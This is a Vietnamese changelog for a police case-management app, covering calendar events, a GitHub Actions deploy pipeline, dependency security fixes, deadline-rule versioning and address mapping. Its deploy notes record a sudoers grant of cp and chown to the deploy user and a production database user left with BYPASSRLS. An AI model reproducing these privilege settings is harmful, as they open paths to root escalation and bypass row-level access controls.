- **`CalendarEvent`** — bảng event mới với 3-tier scope (SYSTEM/TEAM/PERSONAL), recurrence rule (RRULE string), category FK, audit fields (createdBy/updatedBy), soft delete (`deletedAt`). FK `userId` dùng `SetNull` (KHÔNG Cascade) để giữ audit history khi deactivate user.
- **`CalendarEventOccurrenceOverride`** — thin override table cho RFC 5545 RECURRENCE-ID + EXDATE pattern. Replace self-FK approach (eng review #3 — 50 bytes vs 500/row).
- **`EventReminder`** + **`EventReminderDispatch`** — FCM/email reminder tracking với UNIQUE `(reminderId, occurrenceDate)` chống duplicate dispatch.
- **2 enums mới**: `EventScope`, `ReminderChannel`.
- **4 partial indexes** trên `calendar_events` cho hot query paths (eng review #9):
  - `(startDate) WHERE scope='SYSTEM' AND deletedAt IS NULL`
  - `(startDate, teamId) WHERE scope='TEAM' AND deletedAt IS NULL`
  - `(startDate, userId) WHERE scope='PERSONAL' AND deletedAt IS NULL`
  - `(sentAt)` trên `event_reminder_dispatches` cho prune cron tương lai.
- **KHÔNG đụng `Holiday` + `HolidayCategory` enum** — vẫn tồn tại song song.

#### Backend modules (skeleton, gated by feature flags)
- `event-categories` module — `GET /api/v1/event-categories` + `GET /:id`. Gated bởi `@FeatureFlag('event_categories_v2')`. PR 2 sẽ thêm POST/PATCH/DELETE.
- `calendar-events` module — `GET /api/v1/calendar-events?year=&month=` skeleton. Gated bởi `@FeatureFlag('calendar_events_v2')`. PR 2 sẽ thêm CRUD + scope filtering + RRULE expansion.
- `event-reminders` module — `GET /api/v1/events/:eventId/reminders` (current user only). Gated bởi `@FeatureFlag('event_reminders_v2')`. PR 2 sẽ thêm POST/DELETE + cron dispatcher với mutex (eng review #2) + Push/Email integration (qua `PushService.sendToUser` — không phải `firebase-admin` như plan ban đầu hiểu lầm).
- Cả 3 feature flag mặc định **enabled=true** trong seed nhưng được toggle off bằng `gstack-config` hoặc `UPDATE feature_flags SET enabled=false WHERE key='...'` trước khi deploy nếu cần.

#### Calendar dual-read (`backend/src/calendar/calendar.service.ts`)
- `GET /api/v1/calendar/events?year=&month=` giờ đọc CẢ `prisma.holiday.findMany` (legacy) lẫn `prisma.calendarEvent.findMany` (mới), merge và sort theo date.
- Event type mới `'event'` cùng các field `categorySlug/categoryName/categoryColor/scope` để frontend render khác với `'holiday'` cũ.
- **Permission subject đổi từ `'Case'` → `'Calendar'`** (eng review #5 — `'Case'` là sai contract, lẽ ra phải là `'Calendar'` resource riêng).

#### Permissions + seed
- Thêm 4 permissions mới: `Calendar:{read,write,edit,delete}` với description tiếng Việt.
- ADMIN role tự động được grant đầy đủ (loop existing).
- OFFICER role giờ có `Calendar:read` (everyone needs to see calendar).
- `seed-event-categories.ts` — idempotent upsert 5 default categories, mounted vào main seed chain.

### Tests
- 11 backend tests mới:
  - `event-categories.service.spec.ts` (4 cases: list sorted, list empty, findOne hit, findOne miss)
  - `calendar-events.service.spec.ts` (2 cases: findInRange filtered + include category, empty range)
  - `event-reminders.service.spec.ts` (2 cases: listForEvent owned, empty)
  - `calendar.service.spec.ts` (+4 cases mới cho dual-read: merges holidays + events, filters soft-deleted, queries same date range, maps to type='event' with shortTitle preference)
- **Full backend suite: 1091/1091 pass** + `tsc --noEmit` clean.

### Out of scope cho PR 1 (defer to PR 2)
- POST/PATCH/DELETE endpoints cho event-categories, calendar-events, event-reminders.
- Frontend rewrite CalendarPage + EventCategoriesModule UI.
- RRULE recurrence expansion logic.
- Cron dispatcher với mutex + PushService integration.
- Per-user PERSONAL event cap + Throttle.
- DataScope filtering (SYSTEM/TEAM/PERSONAL).
- Migration 25 holiday → CalendarEvent (defer PR 3).
- Documentation updates trong CLAUDE.md (sẽ làm khi PR 2 ship full feature).

### Deploy notes
- Tất cả feature flag mới default ON, nhưng vì frontend chưa gọi endpoints mới nên UI không thấy gì. Backend chỉ thay đổi 1 chỗ: calendar.service đọc thêm `calendar_events` table (sẽ rỗng cho đến khi admin tạo event). Risk thấp.
- Sau deploy chạy: `cd /home/pc02/current/backend && npm run db:seed` (đã include seed-event-categories chain).
- Migration `20260513120000_calendar_events_v2_phase1` chỉ CREATE TABLE, không touch Holiday → safe rollback qua pg_dump nếu cần.

## [0.15.1.1] - 2026-05-13

### Fixed
- **Mapping địa chỉ cải cách 2025 — "Cập nhật từ API" không chạy được**: frontend `AddressMappingModule` vẫn gọi endpoint cũ `POST /address-mappings/crawl` (đã bị xóa từ v0.13.10.0, thay bằng async background job pattern `POST /address-mappings/seed/:province`). Request trả 404 → catch block nuốt error → user thấy mơ hồ "không có kết quả". Bug đã được flag trong `docs/ADDRESS_MAPPING_AUDIT.md:123` nhưng frontend bị bỏ quên.
- Frontend giờ:
  - Có province selector (HCM/HN/HP/DN/CT) cho user chọn tỉnh muốn seed.
  - Gọi `POST /address-mappings/seed/:province` → nhận `jobId` → poll `GET /address-mappings/seed/status/:id` mỗi 2s.
  - Hiển thị progress (`mapped/total`, số `needsReview`, số `errorCount`) trong banner màu theo status (xanh dương = running, xanh lá = completed, đỏ = failed, xám = cancelled).
  - Nút "Hủy" gọi `POST /address-mappings/seed/:id/cancel` khi job đang chạy.
  - Tự refresh table khi job đạt terminal status.
  - Disable nút "Cập nhật từ API" + province selector khi job đang queued/running.

### Tests
- Thêm `frontend/src/pages/settings/modules/__tests__/AddressMappingModule.test.tsx` — 6 test cases bám TDD: verify endpoint mới, province selection, polling cadence, progress display, refresh-on-complete, button disabled trong khi job active. Cũng có regression guard `expect(api.post).not.toHaveBeenCalledWith('/address-mappings/crawl')` để bug này không quay lại.

## [0.15.1.0] - 2026-05-12

### Added — CI/CD Pipeline (GitHub Actions → Viettel Cloud VM)
- `.github/workflows/deploy.yml`: 3-job pipeline (test → build → deploy) tự động chạy khi push `main` hoặc tag `v*`. Tag thêm job thứ 4 tạo GitHub Release với CHANGELOG section extract tự động.
- `scripts/deploy/deploy.sh`: orchestrate deploy trên VM — extract tarball, symlink shared resources, pg_dump pre-deploy backup, `prisma migrate deploy` fail-safe, atomic symlink switch, restart backend, health check, prune giữ 5 release.
- `scripts/deploy/rollback.sh`: switch current symlink về release trước hoặc release cụ thể, restart backend, health check.
- `scripts/deploy/health-check.sh`: 5 retries × 2s curl `/api/v1/health`.
- `scripts/deploy/migrate-existing.sh`: 1-time migration script chuyển VM từ layout SCP cũ sang release-based.
- `docs/DEPLOY.md`: hướng dẫn full pipeline + rollback + troubleshoot.
- VM layout mới: `/home/pc02/releases/<sha>/`, `current` symlink, `shared/` cho `.env`/keys/uploads persist qua deploy.

### Fixed
- `init_rls` migration: rename timestamp `00000000000000` → `99999999999999` để chạy CUỐI cùng (sau khi tables tồn tại). Migration ban đầu fail vì reference table `users` chưa được tạo.
- `CLAUDE.md`: update Deploy Configuration section từ Render placeholder → Viettel Cloud VM thực tế với GitHub Actions pipeline.

### Changed
- Backend `pc02-backend.service` systemd unit giờ trỏ `WorkingDirectory=/home/pc02/current/backend` (theo symlink), restart `RestartSec=10` giữ nguyên.
- `/etc/sudoers.d/pc02`: thêm permission `cp`, `chown` cho user `pc02` để deploy script copy frontend dist vào `/var/www/pc02` không cần root.

### Notes
- Pre-deploy DB backup: `/var/backups/pc02/pre-deploy-<sha>-*.sql.gz` cho mỗi deploy (cùng cron daily 02:30 ICT đã có).
- Migration auto-run với fail-safe: nếu `prisma migrate deploy` fail, symlink KHÔNG switch → backend cũ vẫn chạy.
- Rollback DB: dùng `pg_restore` từ `/var/backups/pc02/pre-deploy-<sha>-*.sql.gz` (Prisma không hỗ trợ auto down migration).
- VM phải cài `rsync` (Ubuntu 24.04 minimized không có sẵn).

## [0.15.0.0] - 2026-05-12

### Added — Lịch ngày đặc biệt (Holidays)
- Trang **Lịch làm việc** giờ hiển thị 25 ngày đặc biệt của Việt Nam, Công an, Quân đội bên cạnh deadline vụ án / vụ việc / đơn thư. Mỗi category có màu riêng (đỏ cờ NATIONAL, xanh CAND POLICE, xanh QĐND MILITARY, cam INTERNATIONAL) để cán bộ phân biệt nhanh giữa hạn nghiệp vụ và lịch lễ.
- Model `Holiday` + enum `HolidayCategory` (NATIONAL/POLICE/MILITARY/INTERNATIONAL/OTHER) trong `prisma/schema.prisma`. Unique theo `(date, title)` — cho phép cùng 1 ngày có nhiều holiday (vd 3/3: Biên phòng + An ninh Nhân dân).
- Seed `prisma/seed-holidays.ts` idempotent, 25 entries cho năm 2026:
  - **8 NATIONAL**: Tết Dương lịch, Tết Nguyên Đán (mùng 1/2/3), Giỗ Tổ Hùng Vương, Giải phóng miền Nam 30/4, Quốc tế Lao động 1/5, Quốc khánh 2/9
  - **7 POLICE**: Truyền thống CAND 19/8, CSGT 21/2, PCCC 4/10, CSHS 18/4, An ninh Nhân dân 3/3, QLHC 4/6, Pháp luật Việt Nam 9/11
  - **6 MILITARY**: Thành lập QĐND 22/12, Toàn quốc kháng chiến 19/12, Hải quân 7/5, Biên phòng 3/3, PK-KQ 22/10, Thương binh - Liệt sỹ 27/7
  - **4 INTERNATIONAL**: 8/3, Thiếu nhi 1/6, Phụ nữ Việt Nam 20/10, Nhà giáo 20/11
- `GET /api/v1/calendar/events?year=&month=` giờ trả thêm event type `holiday` với metadata `holidayCategory` + `isOfficialDayOff` để frontend render badge category và đánh dấu ngày nghỉ chính thức.

### Changed
- `CalendarService.getEvents` merge holiday vào output cùng cases/incidents/petitions, sort theo ngày tăng dần.
- `EventType` ở frontend mở rộng từ 4 → 5 giá trị (thêm `'holiday'`). `eventTypeColors`/`eventTypeLabels` cập nhật tương ứng. Hàm `getEventColor()` chọn màu theo `holidayCategory` khi event là holiday.

### Notes
- Tết Nguyên Đán (mùng 1/2/3) + Giỗ Tổ Hùng Vương phải tính theo lịch âm hàng năm — phiên bản này hardcode năm 2026. Năm 2027 admin cần cập nhật ngày qua DB hoặc tạo cronjob.
- `pc02_user` được grant `BYPASSRLS` trong môi trường production hiện tại để cho phép seed/migrate. Cần audit `prisma.service.ts` xem có set `app.current_user_id` qua middleware không trước khi revoke BYPASSRLS.

### Chore
- Thêm `backend/uploads/` vào `.gitignore` để tránh commit nhầm file user upload runtime.

## [0.14.2.0] - 2026-05-11

### Security — CSO audit hardening (5 findings)
- **2FA backup codes** giờ hash bằng `bcrypt` cost 12 thay vì SHA-256 + salt một vòng. Tấn công bằng GPU brute-force trên DB bị rò rỉ giờ chậm hơn ~6 bậc. Migration `20260511180000_invalidate_legacy_backup_codes` tự động xoá codes cũ cho user có 2FA bật — họ cần re-setup để nhận codes mới hashed bằng bcrypt. Khi deploy, `docker-entrypoint.sh` chạy `prisma migrate deploy` nên migration tự kick in.
- **Frontend `axios` 1.13.5 → 1.16.x** vá GHSA-3w6x-2g7m-8v23 (prototype pollution trong `parseReviver`) và GHSA-q8qp-cvcw-x6jj (credential injection qua HTTP adapter prototype pollution). HIGH severity, direct prod dep.
- **Frontend `postcss` < 8.5.10** vá GHSA-qx2v-qp2m-jg93 (XSS qua unescaped `</style>` trong CSS stringify). Vite dev-tool path.
- **Backend `hono` + `@hono/node-server`** transitive vulns vá qua `npm overrides` mà không phải downgrade Prisma 7. Bao gồm: middleware bypass qua serveStatic, body-limit bypass trên chunked requests, JWT NumericDate validation, JSX HTML injection, cache cross-user leakage. Tất cả là dev-only path qua `@prisma/dev`, không expose runtime nhưng dọn cho sạch.
- **CI Actions pinned theo SHA**: `actions/checkout@34e1148` (v4.3.1) + `actions/setup-node@49933ea` (v4.4.0). Phòng tag-reassignment attack kiểu tj-actions/changed-files 2025.

Tests: 1050/1050 backend Jest + 364/364 frontend Vitest pass. `npm audit`: 0 vulnerabilities ở cả hai side.
## [0.14.3.0] - 2026-05-11

### Added — Workflow "Sửa đề xuất quy tắc sau khi đã gửi duyệt"
Trước thay đổi này, một khi proposer bấm "Gửi duyệt ngay" cho một phiên bản quy tắc thời hạn, họ kẹt cứng — không sửa được, không xóa được, chỉ chờ approver từ chối rồi tạo nháp mới (mất context, audit ồn).

Giờ có **hai con đường đối xứng** đưa version submitted về lại draft để proposer sửa và gửi lại:

- **Proposer tự thu hồi** — trên trang version-detail của một đề xuất đã submit, banner xanh hiện button "Thu hồi để sửa". Click → modal yêu cầu lý do ≥ 10 ký tự → status về `draft`, audit `WITHDRAWN`, approver được báo "đề xuất đã rút lại". Chỉ làm được khi chưa có ai review.
- **Approver yêu cầu sửa đổi** — bên cạnh "Từ chối"/"Duyệt" có thêm button "Yêu cầu sửa đổi". Click → modal yêu cầu note ≥ 10 ký tự → status về `draft` với `reviewedAt + reviewNotes` set, audit `CHANGES_REQUESTED`, proposer được báo "approver yêu cầu sửa: <note>".
- **Sửa nháp UI** — proposer click "Sửa nháp" trên footer draft → mở route mới `/admin/deadline-rules/edit/:id`, form prefill với data cũ, title "Sửa bản nháp đề xuất". Khi đang ở draft sau request-changes, banner vàng pinned trên đầu form hiển thị ghi chú của approver. Save gọi `updateDraft`; "Gửi duyệt lại" gọi `updateDraft + submit`.
- **Cycle clean** — khi proposer resubmit, backend `submit()` tự xóa `reviewedAt/reviewedById/reviewNotes` để vòng lặp tiếp theo bắt đầu sạch. Audit log giữ lại toàn bộ chuỗi: PROPOSED → SUBMITTED → (WITHDRAWN | CHANGES_REQUESTED) → DRAFT_UPDATED → SUBMITTED → APPROVED.
- **Notification mới** — hai loại `DEADLINE_RULE_WITHDRAWN` (báo approver) và `DEADLINE_RULE_CHANGES_REQUESTED` (báo proposer) thêm vào enum.

### Changed — Hardening on existing flow
- **Race window**: `withdraw()` + `requestChanges()` bọc trong Serializable transaction với advisory lock trên `hashtext(ruleKey)` cùng key với `approve()` — concurrent decisions on same rule serialize đúng. Catch cả `P2025` lẫn `P2034` → friendly 409 thay vì 500.
- **Notification scheduling**: notify chạy SAU khi transaction commit (setImmediate ngoài $transaction callback) thay vì trong — phòng case transaction fail mà notification đã bắn.
- **DTO validation**: `withdrawNotes` + `reviewNotes` bắt buộc trim + ≥ 10 ký tự thực (không cho whitespace-only) + Vietnamese error messages.
- **VersionDecisionPage UI semantics**: chỉ hiển thị "Duyệt bởi" trong header khi status là terminal (approved/active/rejected/superseded). Khi `draft + reviewedAt` (post-request-changes) hiển thị banner vàng full-width trên top thay vì sidebar card — proposer không thể bỏ qua note của approver.
- **Mobile footer** sticky action bar dùng `flex-col sm:flex-row` chống overflow khi 4 button.

### Added — Infrastructure
- **`ReasonRequiredModal`** shared component (`features/deadline-rules/components/`) — prop-driven, dùng cho cả withdraw + request-changes.
- **Base Modal a11y** (`components/shared/Modal.tsx`) — Escape key đóng, focus trap, `role="dialog" aria-modal="true"`, autofocus first input, restore focus on close.
- **`BTN_OUTLINE_SLATE`** token mới ở `constants/styles.ts`.
- **RBAC permissions mới**: `withdraw_own` (cho proposer) + `request_changes` (cho approver) trên subject `DeadlineRuleVersion`. ADMIN có cả hai; DEADLINE_APPROVER có `request_changes + approve`.
- **`deadline-rules.controller.spec.ts`** — 15 smoke tests cover toàn bộ 13 endpoint của controller.

### Fixed — Stub-check + contract clarification
- 3 report pages (`MonthlyReportPage`, `QuarterlyReportPage`, `TdacReportPage`) thêm comment giải thích backend trả raw shape (không envelope wrap) — chống regression khi future dev tưởng cần `.data.data`.

Tests: 1075/1075 backend Jest pass + 379/379 frontend Vitest pass. Migrations applied locally. No new TypeScript errors trong deadline-rules feature.

## [0.14.1.0] - 2026-05-11

### Added — URL tham khảo cho mỗi phiên bản quy tắc thời hạn (Phase 1 hybrid)
- **Cột `documentUrl`** trên `deadline_rule_versions` (optional) — admin lưu link tới văn bản pháp luật chính thức (vbpl.vn, chinhphu.vn, quochoi.vn...) cho mỗi đề xuất rule version. Cockpit hiển thị URL như external anchor với `rel="noopener noreferrer"`.
- **`DocumentUrlInput` component**: blur-time validation, inline ✓/⚠ feedback, domain hint chip ("Cơ sở dữ liệu pháp luật quốc gia") khi URL match `LAW_SOURCE_HINTS`, amber sub-chip "không phải nguồn chính thức" cho `thuvienphapluat.vn`. A11y: `aria-invalid`, `aria-describedby`, `role="alert"` trên error.
- **Migration cleanup prefill banner**: từ `/admin/deadline-rules/migration-cleanup` click "Bổ sung tài liệu" → navigate `?prefill=migration` → ProposePage hiển thị dismissible blue banner ("Đề xuất giá trị từ migration hints" + "Dùng đề xuất" + X dismiss). KHÔNG auto-overwrite form fields — admin phải click apply (per autoplan Design consensus).

### Changed — URL validation security hardening
- **DTO `@IsUrl({ protocols: ['http','https'], require_tld, require_protocol, require_host, disallow_auth })`**: reject `ftp://`, `javascript:`, `data:`, `file://`, intranet hosts, basic-auth phishing patterns.
- **Service `assertDocumentUrlSafe()`**: defense-in-depth — parse via `new URL()`, reject hostnames `localhost`, `127.x.x.x`, `10.x.x.x`, `192.168.x.x`, `172.16-31.x.x`, `*.local`, `*.internal`, `0.0.0.0`. SSRF protection layer even though current feature doesn't fetch URLs (future-proofs against fetch-based extensions).

### Migration safety
- **`20260511160000_add_deadline_rule_url`**: simple `ALTER TABLE ... ADD COLUMN IF NOT EXISTS "documentUrl" TEXT`. Idempotent. Postgres takes brief ACCESS EXCLUSIVE lock; table is small (~12-30 rows), <1ms. No backfill needed (nullable column).

### Tests
- **Backend: 1050 tests pass** (+3 in `deadline-rules.service.spec.ts`): documentUrl roundtrip on valid URL, reject `http://localhost` private-host, reject `ftp://` non-http-scheme.
- **Frontend: 364 tests pass** (+7 in `DocumentUrlInput.test.tsx`): empty/untouched state, valid vbpl.vn green hint, javascript: error, localhost error, thuvienphapluat amber non-official chip, onChange callback, no error before blur.

### Out of scope (Phase 2 conditional)
File upload attachment (`DocumentAttachmentPicker`, multipart UI, MIME restrict, Render persistent storage) deferred per autoplan USER CHALLENGE #1 resolution — bring back if VKS audit asks for cached PDF within 3 months, OR vbpl.vn URL breaks, OR ≥2 admins request file upload.

## [0.14.0.0] - 2026-05-11

### Added — Quy trình quản lý phiên bản quy tắc thời hạn (Deadline Rule Versioning)
- **Workflow mới `/admin/deadline-rules`**: admin đề xuất sửa quy tắc thời hạn → người duyệt khác (DEADLINE_APPROVER) review → kích hoạt theo ngày hiệu lực. 6 trang admin mới: danh sách quy tắc, lịch sử phiên bản, đề xuất sửa, hàng đợi duyệt, trang quyết định (diff + impact preview), cleanup tài liệu khởi tạo.
- **Snapshot phiên bản tại lúc tạo vụ việc/đơn thư**: `Incident.deadlineRuleVersionId`, `Incident.giaHan1RuleVersionId`, `Incident.giaHan2RuleVersionId`, `Incident.maxExtensionsSnapshot`, `Petition.deadlineRuleVersionId` — mỗi vụ việc/đơn thư giữ phiên bản quy tắc đã áp dụng để truy ngược lại được cho VKS audit.
- **Maker-checker enforcement ở 3 lớp**: UI disabled button (proposer === viewer), service throws ForbiddenException, partial unique index ở DB. Phòng race condition với `pg_advisory_xact_lock(hashtext(ruleKey))` + Serializable transaction.
- **Audit log tích hợp**: 8 action mới (`DEADLINE_RULE_PROPOSED/SUBMITTED/APPROVED/REJECTED/ACTIVATED/SUPERSEDED/STALE_REVIEW_NOTIFIED/DRAFT_DELETED`) ghi qua `AuditService` hiện có. Không tạo bảng audit riêng.
- **2 cron schedulers mới**: `deadline-rule-activator` (00:01 UTC mỗi ngày — promote `approved` → `active` khi đến ngày hiệu lực, ORDER BY effectiveFrom ASC cho multi-day catch-up); `deadline-rule-stale-notifier` (09:00 UTC mỗi ngày — push notification cho approvers nếu submitted > 24h).
- **5 NotificationType enum mới**: `DEADLINE_RULE_SUBMITTED/APPROVED/REJECTED/ACTIVATED/STALE_REVIEW` — gửi qua `NotificationsService` hiện có cho approver/proposer.
- **Role + permissions mới**: `DEADLINE_APPROVER` role (separation-of-duties checker), 3 permissions (`read:`, `write:`, `approve:DeadlineRuleVersion`). ADMIN có cả 3, DEADLINE_APPROVER có read+approve (KHÔNG write — checker không được tự đề xuất), OFFICER có read.
- **Structured documentRef**: thay free-text bằng 4 trường (`documentType` enum 6 giá trị, `documentNumber`, `documentIssuer` enum 6 giá trị, `documentDate` optional) — VKS-defensible. Hỗ trợ attachment FK tới `Document` (UI defer v2).
- **Impact preview bucketed**: trang quyết định hiển thị 3 buckets — không ảnh hưởng (đã snapshot), sẽ áp dụng khi gia hạn (in-flight), sẽ áp dụng cho vụ việc tạo mới. Drill-down top-5 hạn xử lý gần nhất.
- **Aging buckets cho hàng đợi duyệt**: mới (<1 ngày, green), đang chờ (1-3 ngày, amber), quá hạn duyệt (>3 ngày, red).

### Changed — Loại bỏ silent-stale risk
- **DELETE 12 deadline keys khỏi `system_settings`** trong migration: `THOI_HAN_XAC_MINH`, `THOI_HAN_GIA_HAN_1/2`, `THOI_HAN_TOI_DA`, `THOI_HAN_PHUC_HOI`, `THOI_HAN_PHAN_LOAI`, `SO_LAN_GIA_HAN_TOI_DA`, `THOI_HAN_GUI_QD_VKS`, `THOI_HAN_TO_CAO/KHIEU_NAI/KIEN_NGHI/PHAN_ANH`. Nguồn sự thật runtime giờ là `deadline_rule_versions` table.
- **`SettingsService.getValue/getNumericValue/updateValue` throw `BadRequestException` cho 12 deadline keys** — bảo vệ contract. Bất kỳ caller nào (cũ hay mới) đụng tới deadline key qua SettingsService sẽ fail loud thay vì trả về giá trị stale. CI grep guard recommend bổ sung.
- **`incidents.service.create` (line 286)** đọc `DeadlineRulesService.getActive('THOI_HAN_XAC_MINH')` thay vì `settings.getNumericValue`, snapshot `deadlineRuleVersionId` + `maxExtensionsSnapshot` vào incident record.
- **`incidents.service.extendDeadline` (line 637)**: max-count check đọc `incident.maxExtensionsSnapshot` (frozen từ creation time — admin lowering limit không retroactively block); extension days đọc live từ active rule, snapshot rule-version-id vào `giaHan1RuleVersionId`/`giaHan2RuleVersionId`.
- **`petitions.service.create` (line 302)**: đọc `DeadlineRulesService.getActive(petitionTypeKey)`, snapshot `deadlineRuleVersionId` vào petition record.
- **`SettingsService.seed()`** chỉ seed 3 ops keys (`TWO_FA_ENABLED`, `CANH_BAO_SAP_HAN`, `THOI_HAN_XOA_VU_VIEC`), và `deleteMany` 12 deadline keys phòng hờ ai insert lại.
- **`SettingsPage` (`/admin/settings`)** strip toàn bộ deadline rows + thêm banner redirect prominent tới `/admin/deadline-rules`. Trang cũ giờ chỉ quản lý ops settings.
- **Enum generator regex** mở rộng cho phép lowercase identifiers (vd: `draft`, `submitted`) để generate `DeadlineRuleStatus` từ Prisma schema.

### Migration safety
- **Migration atomic `20260511120000_deadline_rule_versioning`**:
  - Tạo `deadline_rule_status` enum + `deadline_rule_versions` table
  - 3 partial unique indexes (one-active, one-submitted, one-approved-pending per `ruleKey`) — DB-level concurrency guarantee
  - CHECK constraint `status != 'active' OR effectiveFrom IS NOT NULL`
  - 5 enum values vào `NotificationType`
  - 4 FK columns trên `incidents` + `petitions` + indexes, ON DELETE RESTRICT
  - Seed 12 v1 active versions từ `system_settings` (proposedByType='SYSTEM', migrationConfidence='legacy-default')
  - Backfill `deadlineRuleVersionId` cho mọi Incident/Petition không-soft-deleted
  - DELETE 12 deadline keys khỏi `system_settings`
  - RBAC seed (3 permissions + DEADLINE_APPROVER role + role assignments cho ADMIN/DEADLINE_APPROVER/OFFICER)
  - Idempotent: mọi INSERT dùng `WHERE NOT EXISTS`, mọi enum/index dùng `IF NOT EXISTS` hoặc DO block với `EXCEPTION WHEN duplicate_object`.
- **Fresh DB seeder mới** `prisma/seed-deadline-rules.ts`: idempotent seed 12 v1 versions với deterministic IDs (`rule_init_{key}`). Gọi từ `seed.ts` chính.

### Tests
- **Backend: 1047 tests pass** (added 111 tests): `deadline-rules.service.spec.ts` (40 cases — state gates, maker-checker, race translation, multi-day catch-up, stale notif), 2 scheduler specs, updated `settings.service.spec.ts` cho hard-guard 12 deadline keys (parameterized), updated `incidents.service.spec.ts` + `petitions.service.spec.ts` cho `DeadlineRulesService` mock + snapshot assertions.
- **Frontend: 357 tests pass** (added 25 tests cho deadline-rules feature): `StatusBadge` (6 statuses + virtual sub-status), `DiffViewer` (hero diff, stacked field, unchanged collapse), `ImpactPreviewPanel` (buckets, drilldown), `DeadlineRulesListPage` (5 — summary strip, badges, links), `ApprovalQueuePage` (3 — aging buckets), `ProposeDeadlineRulePage` (4 — preload, validation, submit).



### Changed (Địa giới hành chính mới — bulk-seed từ provinces.open-api.vn)
- **Bỏ `crawlAndSync` hard-coded** — DISTRICT_TO_NEW_WARD map cũ chỉ có ~10 quận và punt toàn bộ Q1-Q12 + Thủ Đức. Thay bằng bulk-seed background job hit `provinces.open-api.vn` v1 + v2 API (`/api/p/{code}?depth=3` lấy old structure → cho mỗi old ward gọi `/api/v2/w/from-legacy/?legacy_code=N` → upsert vào DB local).
- **Endpoint mới**: `POST /address-mappings/seed/:province` (returns 202 + jobId), `GET /address-mappings/seed/status/:id` (poll progress), `POST /address-mappings/seed/:id/cancel`. Endpoint cũ `/crawl` đã bị xóa.
- **Concurrency lock**: refuse start nếu province đã có job `queued`/`running`. Worker check `cancelToken` giữa mỗi ward → graceful cancel.
- **Snapshot raw API response** vào `backend/prisma/data/snapshots/{province}-v1-{ts}.json` (gitignored) để reproduce nếu API offline.
- **HCM fully supported** (~322 wards, run ~30s). HN/HP/DN/CT có API code wired nhưng chưa seed (follow-up).

### Fixed
- **Bug 1 — Abbreviations không nhận được**: `expandAddressAbbreviations` chạy TRƯỚC khi extract pattern. Unicode-safe lookbehind `(?<!\p{L})` xử lý đúng các trường hợp `P3`, `P.3`, `P03`, `p3`, `Q10`, `H. Bình Chánh`; KHÔNG match `OP3`/`ấP3`/`ờQ10`.
- **Bug 2 — Phường 5, Quận 3 không thành Phường Bàn Cờ**: trước đây map punt Q1-Q12. Sau seed, regression test xác nhận `lookup('Phường 5', 'Quận 3', 'HCM') → 'phường bàn cờ'`.
- **Default province inference HCM**: khi text không có pattern tỉnh, fallback `HCM` (per user direction — PC02 officers ghi địa chỉ local không kèm tỉnh).

### Schema
- `AddressMapping` thêm 3 cột: `source` (`'api-v2'` / `'manual'` / `'official-decree'`), `seededAt`, `candidates` (JSON, khi `needsReview=true` lưu toàn bộ candidate new wards từ API).
- Bảng mới `address_seed_jobs` track job state (queued/running/completed/failed/cancelled) + progress counters + cancellation token.

### Tests
- +18 backend tests (25 total trên module): unknown province, concurrency lock, happy path startSeedJob; missing/completed/running cancelSeedJob; 9 controller delegation; Bàn Cờ regression. 988 backend tests pass.
- +24 frontend tests (new file `useAddressConverter.test.ts`): 13 cases cho `expandAddressAbbreviations` (incl. accented Vietnamese boundary), 6 cho `inferProvince`, 5 cho `extractComponents`.

### Audit
- `docs/ADDRESS_MAPPING_AUDIT.md` — kiến trúc, schema, endpoints, runbook, known limitations (5 provinces enabled nhưng chưa seed, 58 provinces missing, ambiguous picker UI defer).

## [0.13.7.0] - 2026-05-10

### Added
- **Phím tắt (Settings module 9)** — màn hình `Cài đặt → Phím tắt` cho phép user tùy chỉnh 14 hành động trên 4 nhóm (Trong form / Trong danh sách / Trong nhập liệu / Toàn cục). Mỗi hàng có 2 cách đổi: gõ trực tiếp `Ctrl+Shift+S`/`Alt+8`/`?` hoặc click "Bắt phím" để hệ thống capture. Cảnh báo khi conflict với browser (Ctrl+S/P/F5...) hoặc với hành động khác — nếu trùng action, có nút **Hoán đổi 2 phím** atomic. Reset từng phím hoặc reset toàn bộ. Filter input + counter "Đã tùy chỉnh: X/14" hiển thị tiến độ.
- **Bảng phím tắt (`?` overlay)** — nhấn `?` bất kỳ đâu để mở modal liệt kê tất cả phím tắt + hành động hiện tại + link sang Settings.
- **Hint phím tắt cạnh nút Lưu** — `<kbd>Ctrl+Shift+S</kbd>` hiển thị inline trên thanh form action; user thấy phím tắt mà không cần mở Settings.
- **Đồng bộ phím tắt đa thiết bị** — DB lưu override per-user; sync giữa các tab cùng browser qua BroadcastChannel (~500ms). Login từ máy khác → setting follow.

### Changed
- **F9 (mở rộng từ viết tắt) + F10 (chuyển đổi địa chỉ) + Ctrl+Shift+L (toggle Quận/Huyện cũ)** — chuyển từ hardcoded `addEventListener` sang central registry. User có thể đổi binding nếu muốn; pattern hiện hữu giữ nguyên.
- **Lưu (Ctrl+Shift+S) + Hủy (Esc)** trong FormActionBar — thay vì chỉ click chuột, mọi form sử dụng FormActionBar (Case/Petition/Incident/Proposal) tự động có 2 phím tắt này.
- **Đăng xuất (Ctrl+Shift+Q)** — phím tắt toàn cục từ MainLayout.

### Tooling
- **react-hotkeys-hook@5.3.2** — thay thế ~470 LOC custom listener engineering bằng thư viện đã được test với React 18 StrictMode (5M+ weekly DL).
- **Backend `UserShortcut` model** — Prisma migration với `@@unique([userId, action])` và `@@unique([userId, binding])` (DB-enforced race-safe). REST endpoints: `GET/PUT/DELETE /user-shortcuts`, `POST /user-shortcuts/reset`, `POST /user-shortcuts/swap` (atomic via `prisma.$transaction`).

### Tests
- **+46 tests** (21 BE user-shortcuts service+controller, 25 FE registry serialize/parse/normalize).
- **Total: 1274 tests pass** (966 BE + 308 FE).

## [0.13.6.0] - 2026-05-10

### Added
- **Web: Pre-fill defaults across mọi form "tạo mới"** — Khi mở form thêm mới Vụ án/Vụ việc/Đơn thư/Đề xuất VKS/Hướng dẫn đơn/Ủy thác, các field "Ngày tiếp nhận", "Cán bộ thụ lý/nhập", "Đơn vị thụ lý" tự động điền sẵn theo current user + đội/tổ. User chỉ phải chỉnh sửa khi thực sự khác. Cả FK (`assignedTeamId`) lẫn text label đều được điền — đảm bảo record mới hiện đúng trong scope filter của user thay vì biến mất.
- **Backend: GET /auth/me** — Endpoint mới trả về profile + danh sách team (id, name, leader flag) + primary team. FE cache trong sessionStorage và dùng cho form pre-fill. JWT giữ nguyên (chỉ chứa role/email/canDispatch) — không bump tokenVersion khi admin đổi team.
- **Frontend: useFormDefaults() hook + useAuthHydration() hook** — Centralize 1 source of truth cho default values, 1 effect duy nhất quản hydration profile từ /auth/me. Login/2FA/refresh chỉ set tokens; hydration tự fire qua custom event.
